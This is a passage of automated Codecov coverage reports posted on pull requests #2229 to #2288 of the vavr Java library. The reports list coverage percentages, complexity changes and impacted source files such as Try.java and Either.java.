(\u00f8) | 1% <0%> (\u00f8) | :arrow_down: |\n| ...rc/main/java/io/vavr/collection/PriorityQueue.java | 98.67% <0%> (\u00f8) | 108% <0%> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/control/Try.java | 95.7% <0%> (+0.02%) | 98% <0%> (\u00f8) | :arrow_down: |\n| ... and 2 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update d99edf4...dd0ce46. Read the comment docs.\n. # Codecov Report\nMerging #2229 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2229      +/-\n============================================\n+ Coverage     97.14%   97.14%   +<.01%   \n  Complexity     5282     5282            \n============================================\n  Files            94       94            \n  Lines         12177    12180       +3   \n  Branches       1595     1595            \n============================================\n+ Hits          11829    11832       +3   \n  Misses          194      194            \n  Partials        154      154\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/Stream.java | 99.02% <100%> (\u00f8) | 268 <0> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 63d77ac...77efbff. Read the comment docs.\n. # Codecov Report\nMerging #2231 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2231      +/-\n============================================\n+ Coverage     97.16%   97.17%   +<.01%   \n- Complexity     5329     5342      +13   \n============================================\n  Files            94       94            \n  Lines         12261    12285      +24   \n  Branches       1595     1596       +1   \n============================================\n+ Hits          11914    11938      +24   \n  Misses          193      193            \n  Partials        154      154\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/TreeMap.java | 93.89% <\u00f8> (\u00f8) | 162 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/HashSet.java | 95.83% <\u00f8> (\u00f8) | 140 <0> (\u00f8) | :arrow_down: |\n| ...rc/main/java/io/vavr/collection/LinkedHashSet.java | 96.66% <\u00f8> (\u00f8) | 145 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/HashMap.java | 98.36% <\u00f8> (\u00f8) | 135 <0> (\u00f8) | :arrow_down: |\n| ...rc/main/java/io/vavr/collection/LinkedHashMap.java | 97.75% <\u00f8> (\u00f8) | 139 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/TreeSet.java | 100% <\u00f8> (\u00f8) | 169 <0> (\u00f8) | :arrow_down: |\n| ...rc/main/java/io/vavr/collection/PriorityQueue.java | 98.68% <100%> (+0.01%) | 110 <2> (+2) | :arrow_up: |\n| ...avr/src/main/java/io/vavr/collection/Iterator.java | 99.22% <100%> (\u00f8) | 181 <1> (+1) | :arrow_up: |\n| ...in/java/io/vavr/collection/LinkedHashMultimap.java | 96.61% <100%> (+0.05%) | 10 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Queue.java | 96.79% <100%> (+0.01%) | 203 <1> (+1) | :arrow_up: |\n| ... and 8 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update fbdacec...d558efb. Read the comment docs.\n. # Codecov Report\nMerging #2241 into master will increase coverage by 0.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2241      +/-\n============================================\n+ Coverage     97.17%   97.19%   +0.01%   \n- Complexity     5342     5345       +3   \n============================================\n  Files            94       94            \n  Lines         12285    12288       +3   \n  Branches       1596     1596            \n============================================\n+ Hits          11938    11943       +5   \n+ Misses          193      192       -1   \n+ Partials        154      153       -1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/control/Validation.java | 99.06% <100%> (+0.01%) | 67 <2> (+2) | :arrow_up: |\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 80.99% <0%> (+1.65%) | 28% <0%> (+1%) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 91a96ca...b93b660. Read the comment docs.\n. # Codecov Report\nMerging #2242 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2242      +/-\n============================================\n+ Coverage     97.17%   97.17%   +<.01%   \n- Complexity     5344     5346       +2   \n============================================\n  Files            94       94            \n  Lines         12288    12291       +3   \n  Branches       1596     1596            \n============================================\n+ Hits          11941    11944       +3   \n  Misses          193      193            \n  Partials        154      154\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/control/Either.java | 100% <100%> (\u00f8) | 50 <2> (+2) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 00205bc...089ab7b. Read the comment docs.\n. # Codecov Report\nMerging #2244 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2244   +/-\n=========================================\n  Coverage     97.17%   97.17%         \n  Complexity     5344     5344         \n=========================================\n  Files            94       94         \n  Lines         12288    12288         \n  Branches       1596     1596         \n=========================================\n  Hits          11941    11941         \n  Misses          193      193         \n  Partials        154      154\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 00205bc...c493c4a. Read the comment docs.\n. # Codecov Report\nMerging #2255 into master will not change coverage.\nThe diff coverage is 100%.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2255   +/-\n=========================================\n  Coverage     97.17%   97.17%         \n  Complexity     5344     5344         \n=========================================\n  Files            94       94         \n  Lines         12288    12288         \n  Branches       1596     1596         \n=========================================\n  Hits          11941    11941         \n  Misses          193      193         \n  Partials        154      154\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/TreeSet.java | 100% <100%> (\u00f8) | 169 <0> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update a9b7b0e...013b55a. Read the comment docs.\n. # Codecov Report\nMerging #2256 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2256      +/-\n============================================\n+ Coverage     97.57%   97.57%   +<.01%   \n- Complexity     5293     5296       +3   \n============================================\n  Files            93       93            \n  Lines         12694    12699       +5   \n  Branches       1611     1612       +1   \n============================================\n+ Hits          12386    12391       +5   \n  Misses          155      155            \n  Partials        153      153\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/control/Either.java | 100% <100%> (\u00f8) | 53 <2> (+3) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update be6dc4c...9809167. Read the comment docs.\n. # Codecov Report\nMerging #2257 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2257      +/-\n============================================\n+ Coverage     97.17%   97.17%   +<.01%   \n- Complexity     5344     5349       +5   \n============================================\n  Files            94       94            \n  Lines         12288    12303      +15   \n  Branches       1596     1596            \n============================================\n+ Hits          11941    11956      +15   \n  Misses          193      193            \n  Partials        154      154\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/control/Option.java | 100% <100%> (\u00f8) | 45 <1> (+1) | :arrow_up: |\n| vavr/src/main/java/io/vavr/control/Try.java | 95.75% <100%> (+0.04%) | 99 <1> (+1) | :arrow_up: |\n| vavr/src/main/java/io/vavr/control/Either.java | 100% <100%> (\u00f8) | 50 <2> (+2) | :arrow_up: |\n| vavr/src/main/java/io/vavr/control/Validation.java | 99.07% <100%> (+0.01%) | 68 <1> (+1) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update a9b7b0e...bb0150a. Read the comment docs.\n. # Codecov Report\nMerging #2258 into master will not change coverage.\nThe diff coverage is 100%.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2258   +/-\n=========================================\n  Coverage     97.17%   97.17%         \n  Complexity     5344     5344         \n=========================================\n  Files            94       94         \n  Lines         12288    12288         \n  Branches       1596     1596         \n=========================================\n  Hits          11941    11941         \n  Misses          193      193         \n  Partials        154      154\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| .../src/main/java/io/vavr/collection/Collections.java | 95.08% <100%> (\u00f8) | 130 <5> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update a9b7b0e...5ef9bf8. Read the comment docs.\n. # Codecov Report\nMerging #2264 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2264   +/-\n=========================================\n  Coverage     97.17%   97.17%         \n  Complexity     5349     5349         \n=========================================\n  Files            94       94         \n  Lines         12303    12303         \n  Branches       1596     1596         \n=========================================\n  Hits          11956    11956         \n  Misses          193      193         \n  Partials        154      154\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 79.33% <\u00f8> (\u00f8) | 27 <0> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 1d07ffb...f368ee4. Read the comment docs.\n. # Codecov Report\nMerging #2267 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2267      +/-\n============================================\n+ Coverage     97.17%   97.18%   +<.01%   \n+ Complexity     5349     5331      -18   \n============================================\n  Files            94       94            \n  Lines         12303    12302       -1   \n  Branches       1596     1598       +2   \n============================================\n  Hits          11956    11956            \n+ Misses          193      192       -1   \n  Partials        154      154\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/Set.java | 100% <\u00f8> (+33.33%) | 2 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Seq.java | 97.82% <\u00f8> (-0.18%) | 40 <0> (-10) | |\n| ...r/src/main/java/io/vavr/collection/IndexedSeq.java | 97.43% <100%> (+0.04%) | 35 <1> (-2) | :arrow_down: |\n| ...avr/src/main/java/io/vavr/collection/Multimap.java | 98.41% <100%> (+0.02%) | 27 <1> (-1) | :arrow_down: |\n| ...vr/src/main/java/io/vavr/collection/LinearSeq.java | 96.77% <100%> (+0.07%) | 18 <1> (-2) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Map.java | 100% <100%> (\u00f8) | 33 <1> (-3) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 23b5232...95dace5. Read the comment docs.\n. # Codecov Report\nMerging #2268 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2268   +/-\n=========================================\n  Coverage     97.18%   97.18%         \n  Complexity     5331     5331         \n=========================================\n  Files            94       94         \n  Lines         12302    12302         \n  Branches       1598     1598         \n=========================================\n  Hits          11956    11956         \n  Misses          192      192         \n  Partials        154      154\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/Lazy.java | 100% <\u00f8> (\u00f8) | 34 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/HashSet.java | 95.83% <\u00f8> (\u00f8) | 140 <0> (\u00f8) | :arrow_down: |\n| ...rc/main/java/io/vavr/collection/LinkedHashSet.java | 96.66% <\u00f8> (\u00f8) | 145 <0> (\u00f8) | :arrow_down: |\n| ...vr/src/main/java/io/vavr/collection/LinearSeq.java | 96.77% <\u00f8> (\u00f8) | 18 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Vector.java | 99.69% <\u00f8> (\u00f8) | 213 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Queue.java | 96.79% <\u00f8> (\u00f8) | 203 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/CharSeq.java | 99.82% <\u00f8> (\u00f8) | 349 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/control/Try.java | 95.75% <\u00f8> (\u00f8) | 99 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/concurrent/Future.java | 97.95% <\u00f8> (\u00f8) | 120 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/List.java | 99.62% <\u00f8> (\u00f8) | 268 <0> (\u00f8) | :arrow_down: |\n| ... and 13 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update ffcacd0...1520e7d. Read the comment docs.\n. # Codecov Report\nMerging #2270 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2270   +/-\n=========================================\n  Coverage     97.18%   97.18%         \n  Complexity     5331     5331         \n=========================================\n  Files            94       94         \n  Lines         12302    12302         \n  Branches       1598     1598         \n=========================================\n  Hits          11956    11956         \n  Misses          192      192         \n  Partials        154      154\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update f767ce6...7c897aa. Read the comment docs.\n. # Codecov Report\nMerging #2271 into master will decrease coverage by <.01%.\nThe diff coverage is n/a.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2271      +/-\n============================================\n- Coverage     97.18%   97.18%   -0.01%   \n+ Complexity     5331     5313      -18   \n============================================\n  Files            94       94            \n  Lines         12302    12284      -18   \n  Branches       1598     1598            \n============================================\n- Hits          11956    11938      -18   \n  Misses          192      192            \n  Partials        154      154\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src-gen/main/java/io/vavr/Function8.java | 95.65% <\u00f8> (-0.19%) | 10 <0> (-1) | |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction4.java | 96.66% <\u00f8> (-0.11%) | 13 <0> (-1) | |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction2.java | 96.42% <\u00f8> (-0.13%) | 14 <0> (-1) | |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction8.java | 97.05% <\u00f8> (-0.09%) | 13 <0> (-1) | |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction6.java | 96.87% <\u00f8> (-0.1%) | 13 <0> (-1) | |\n| vavr/src-gen/main/java/io/vavr/Function2.java | 94.11% <\u00f8> (-0.33%) | 10 <0> (-1) | |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction0.java | 96% <\u00f8> (-0.16%) | 15 <0> (-1) | |\n| vavr/src-gen/main/java/io/vavr/Function4.java | 94.73% <\u00f8> (-0.27%) | 10 <0> (-1) | |\n| vavr/src-gen/main/java/io/vavr/Function7.java | 95.45% <\u00f8> (-0.2%) | 10 <0> (-1) | |\n| vavr/src-gen/main/java/io/vavr/Function3.java | 94.44% <\u00f8> (-0.3%) | 10 <0> (-1) | |\n| ... and 8 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update f767ce6...5c9c0c4. Read the comment docs.\n. # Codecov Report\nMerging #2272 into master will increase coverage by 0.01%.\nThe diff coverage is 97.18%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2272      +/-\n============================================\n+ Coverage     97.18%   97.19%   +0.01%   \n- Complexity     5313     5314       +1   \n============================================\n  Files            94       94            \n  Lines         12284    12311      +27   \n  Branches       1598     1598            \n============================================\n+ Hits          11938    11966      +28   \n- Misses          192      193       +1   \n+ Partials        154      152       -2\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src-gen/main/java/io/vavr/API.java | 92.79% <\u00f8> (\u00f8) | 193 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/Value.java | 93.72% <100%> (\u00f8) | 142 <1> (+1) | :arrow_up: |\n| ...-test/src-gen/main/java/io/vavr/test/Property.java | 100% <100%> (\u00f8) | 19 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/control/Try.java | 96.11% <90.9%> (+0.36%) | 99 <0> (\u00f8) | :arrow_down: |\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 79.33% <0%> (\u00f8) | 27% <0%> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 90742df...4e7b706. Read the comment docs.\n. # Codecov Report\nMerging #2274 into master will increase coverage by 0.01%.\nThe diff coverage is n/a.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2274      +/-\n============================================\n+ Coverage     97.19%   97.21%   +0.01%   \n- Complexity     5314     5315       +1   \n============================================\n  Files            94       94            \n  Lines         12311    12311            \n  Branches       1598     1598            \n============================================\n+ Hits          11966    11968       +2   \n+ Misses          193      192       -1   \n+ Partials        152      151       -1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 80.99% <0%> (+1.65%) | 28% <0%> (+1%) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 984f126...3a356b6. Read the comment docs.\n. # Codecov Report\nMerging #2276 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2276      +/-\n============================================\n+ Coverage     97.54%   97.54%   +<.01%   \n- Complexity     5314     5320       +6   \n============================================\n  Files            93       93            \n  Lines         12267    12275       +8   \n  Branches       1598     1599       +1   \n============================================\n+ Hits          11966    11974       +8   \n  Misses          149      149            \n  Partials        152      152\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/PartialFunction.java | 100% <100%> (\u00f8) | 8 <8> (+5) | :arrow_up: |\n| vavr/src/main/java/io/vavr/control/Option.java | 100% <100%> (\u00f8) | 45 <0> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 53537a9...008b4f0. Read the comment docs.\n. # Codecov Report\nMerging #2278 into master will decrease coverage by 0.17%.\nThe diff coverage is 97.19%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2278      +/-\n============================================\n- Coverage     97.54%   97.36%   -0.18%   \n+ Complexity     5320     5281      -39   \n============================================\n  Files            93       94       +1   \n  Lines         12275    12234      -41   \n  Branches       1599     1595       -4   \n============================================\n- Hits          11974    11912      -62   \n- Misses          149      169      +20   \n- Partials        152      153       +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src-gen/main/java/io/vavr/Tuple5.java | 100% <\u00f8> (\u00f8) | 47 <0> (-2) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Tuple8.java | 100% <\u00f8> (\u00f8) | 61 <0> (-2) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Tuple2.java | 100% <\u00f8> (\u00f8) | 34 <0> (-2) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Tuple0.java | 100% <\u00f8> (\u00f8) | 21 <0> (-2) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Tuple3.java | 100% <\u00f8> (\u00f8) | 37 <0> (-2) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Tuple7.java | 100% <\u00f8> (\u00f8) | 57 <0> (-2) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Tuple1.java | 100% <\u00f8> (\u00f8) | 24 <0> (-2) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Tuple6.java | 100% <\u00f8> (\u00f8) | 52 <0> (-2) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Tuple4.java | 100% <\u00f8> (\u00f8) | 42 <0> (-2) | :arrow_down: |\n| vavr/src/main/java/io/vavr/Lambda.java | 87.5% <\u00f8> (\u00f8) | 1 <0> (\u00f8) | :arrow_down: |\n| ... and 25 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 42ff0a2...b0520a5. Read the comment docs.\n. # Codecov Report\nMerging #2280 into master will not change coverage.\nThe diff coverage is 100%.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2280   +/-\n=========================================\n  Coverage     97.36%   97.36%         \n  Complexity     5281     5281         \n=========================================\n  Files            94       94         \n  Lines         12234    12234         \n  Branches       1595     1595         \n=========================================\n  Hits          11912    11912         \n  Misses          169      169         \n  Partials        153      153\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/Lazy.java | 100% <100%> (\u00f8) | 34 <3> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 7ec6452...7d84708. Read the comment docs.\n. # Codecov Report\nMerging #2281 into master will increase coverage by 0.06%.\nThe diff coverage is 99.46%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2281      +/-\n============================================\n+ Coverage     97.36%   97.43%   +0.06%   \n- Complexity     5281     5305      +24   \n============================================\n  Files            94       94            \n  Lines         12234    12678     +444   \n  Branches       1595     1595            \n============================================\n+ Hits          11912    12353     +441   \n- Misses          169      172       +3   \n  Partials        153      153\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src-gen/main/java/io/vavr/API.java | 95.73% <99.46%> (+2.94%) | 217 <24> (+24) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update e01b510...84fe0e7. Read the comment docs.\n. # Codecov Report\nMerging #2282 into master will increase coverage by 0.14%.\nThe diff coverage is 88.3%.\n\n\n```diff\n@@             Coverage Diff             @@\nmaster   #2282      +/-\n===========================================\n+ Coverage     97.36%   97.5%   +0.14%   \n+ Complexity     5281    5267      -14   \n===========================================\n  Files            94      93       -1   \n  Lines         12234   12244      +10   \n  Branches       1595    1610      +15   \n===========================================\n+ Hits          11912   11939      +27   \n+ Misses          169     152      -17   \n  Partials        153     153\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src-gen/main/java/io/vavr/API.java | 92.66% <\u00f8> (-0.13%) | 184 <0> (-9) | |\n| vavr/src-gen/main/java/io/vavr/Function0.java | 100% <100%> (+13.33%) | 9 <1> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction0.java | 84% <55.55%> (-8%) | 12 <3> (-2) | |\n| vavr/src-gen/main/java/io/vavr/Function7.java | 96.15% <90%> (+5.24%) | 10 <3> (+1) | :arrow_up: |\n| vavr/src-gen/main/java/io/vavr/Function1.java | 96.29% <90%> (+4.62%) | 14 <3> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Function4.java | 95.65% <90%> (+6.17%) | 10 <3> (+1) | :arrow_up: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction1.java | 96.55% <90%> (+3.21%) | 14 <3> (-2) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction6.java | 96.87% <90%> (+3.12%) | 11 <3> (-1) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction5.java | 96.77% <90%> (+3.22%) | 11 <3> (-1) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction8.java | 97.05% <90%> (+2.94%) | 11 <3> (-1) | :arrow_down: |\n| ... and 9 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update e01b510...d7af77d. Read the comment docs.\n. # Codecov Report\nMerging #2285 into master will decrease coverage by 0.02%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2285      +/-\n============================================\n- Coverage     97.57%   97.55%   -0.03%   \n+ Complexity     5296     5267      -29   \n============================================\n  Files            93       93            \n  Lines         12699    12668      -31   \n  Branches       1612     1602      -10   \n============================================\n- Hits          12391    12358      -33   \n- Misses          155      157       +2   \n  Partials        153      153\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/Value.java | 93.01% <\u00f8> (-0.72%) | 104 <0> (-38) | |\n| vavr/src/main/java/io/vavr/concurrent/Future.java | 97.95% <\u00f8> (\u00f8) | 120 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/control/Either.java | 99.03% <\u00f8> (-0.97%) | 52 <0> (-1) | |\n| vavr/src/main/java/io/vavr/control/Option.java | 100% <100%> (\u00f8) | 51 <6> (+6) | :arrow_up: |\n| vavr/src/main/java/io/vavr/control/Try.java | 95.81% <100%> (-0.3%) | 103 <4> (+4) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 6181eb8...998d68c. Read the comment docs.\n. # Codecov Report\nMerging #2286 into master will decrease coverage by 0.15%.\nThe diff coverage is n/a.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2286      +/-\n============================================\n- Coverage     97.55%   97.39%   -0.16%   \n+ Complexity     5267     5257      -10   \n============================================\n  Files            93       93            \n  Lines         12668    12569      -99   \n  Branches       1602     1581      -21   \n============================================\n- Hits          12358    12242     -116   \n- Misses          157      173      +16   \n- Partials        153      154       +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/control/Either.java | 82.56% <\u00f8> (-16.47%) | 42 <0> (-10) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 70c0c09...ce65a2e. Read the comment docs.\n. # Codecov Report\nMerging #2288 into master will decrease coverage by 0.03%.\nThe diff coverage is 75%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2288      +/-\n============================================\n- Coverage     97.39%   97.36%   -0.04%   \n+ Complexity     5257     5243      -14   \n============================================\n  Files            93       93            \n  Lines         12569    12544      -25   \n  Branches       1581     1578       -3   \n============================================\n- Hits          12242    12213      -29   \n- Misses          173      177       +4   \n  Partials        154      154\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/control/Try.java | 95.76% <\u00f8> (-0.06%) | 101 <0> (-2) | |\n| .../src/main/java/io/vavr/collection/Traversable.java | 98.43% <\u00f8> (\u00f8) | 103 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/control/Validation.java | 99.07% <\u00f8> (\u00f8) | 68 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/Value.java | 92.35% <\u00f8> (-0.66%) | 96 <0> (-8) | |\n| vavr/src/main/java/io/vavr/concurrent/Future.java | 97.92% <\u00f8> (-0.04%) | 119 <0> (-1) | |\n| vavr/src/main/java/io/vavr/Lazy.java | 100% <\u00f8> (\u00f8) | 33 <0> (-1) | :arrow_down: |\n| vavr/src/main/java/io/vavr/control/Option.java | 100% <100%> (\u00f8) | 51 <2> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/control/Either.java | 78.89% <50%> (-3.67%) | 40 <0> (-2) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by 